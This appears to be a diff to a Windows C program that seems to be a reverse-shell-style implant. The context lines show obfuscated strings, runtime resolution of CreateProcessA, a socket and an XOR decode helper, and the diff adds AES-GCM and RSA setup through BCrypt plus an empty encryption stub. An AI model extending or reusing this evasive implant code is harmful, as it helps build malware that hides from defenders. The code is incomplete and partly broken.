@@ -19,6 +19,93 @@ int main(){
     PROCESS_INFORMATION pinfo;
 
 
+
+    //AES initialisation
+    BCRYPT_ALG_HANDLE aesAlgorithm = NULL;
+    BCRYPT_KEY_HANDLE aesKey = NULL;
+    BYTE *pbKeyObject = NULL;
+    ULONG cbKeyObject = 0;
+    ULONG result = 0;
+    NTSTATUS status;
+    BYTE pbSecret[32]; // Replace with your AES key bytes (16, 24, or 32 bytes)
+    
+    ULONG cbSecret = sizeof(pbSecret);
+    BYTE nonce[12]; 
+    
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_INIT(&authInfo);
+
+    status = BCryptOpenAlgorithmProvider(&aesAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+    if (!BCRYPT_SUCCESS(status)) {
+        return;
+    }
+
+
+
+
+
+    status = BCryptGenRandom(aesAlgorithm, pbSecret, cbSecret, 0);
+    status = BCryptGenRandom(NULL, nonce, sizeof(nonce), 0);
+    status = BCryptSetProperty(
+        aesAlgorithm,
+        BCRYPT_CHAINING_MODE,
+        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
+        sizeof(BCRYPT_CHAIN_MODE_GCM),
+        0
+    );
+    if (!BCRYPT_SUCCESS(status)) {
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return;
+    }
+
+    status = BCryptGetProperty(
+        aesAlgorithm,
+        BCRYPT_OBJECT_LENGTH,
+        (PUCHAR)&cbKeyObject,
+        sizeof(cbKeyObject),
+        &result,
+        0
+    );
+    if (!BCRYPT_SUCCESS(status)) {
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return;
+    }
+
+    //Allow memory
+    pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+
+
+    if (pbKeyObject == NULL) {
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return;
+    }
+
+    status = BCryptGenerateSymmetricKey(
+        aesAlgorithm,
+        &aesKey,
+        pbKeyObject,
+        cbKeyObject,
+        pbSecret,
+        cbSecret,
+        0
+    );
+    if (!BCRYPT_SUCCESS(status)) {
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        return;
+    }
+
+
+    
+
+    
+    BCRYPT_ALG_HANDLE rsaAlgorithm = NULL;
+
+
+    
+    BCryptOpenAlgorithmProvider(&rsaAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
+
+
     //Get a handle in a DLL Windows that is already mapped
     HMODULE hKernel32 = GetModuleHandleA(s_kernel);
     //Locate the memory adress of the function "CreateProcessA"
@@ -89,7 +176,15 @@ int main(){
 // cleanup
     closesocket(soc);
     WSACleanup();
-
+    if (aesKey) {
+        BCryptDestroyKey(aesKey);
+    }
+    if (pbKeyObject) {
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+    }
+    if (aesAlgorithm) {
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+    }
     return 0;
 }
 
@@ -100,3 +195,8 @@ char* decode(char* message, char key, int lenght){
     }
     return message;
 }
+
+void AES_encode(){
+
+}
+
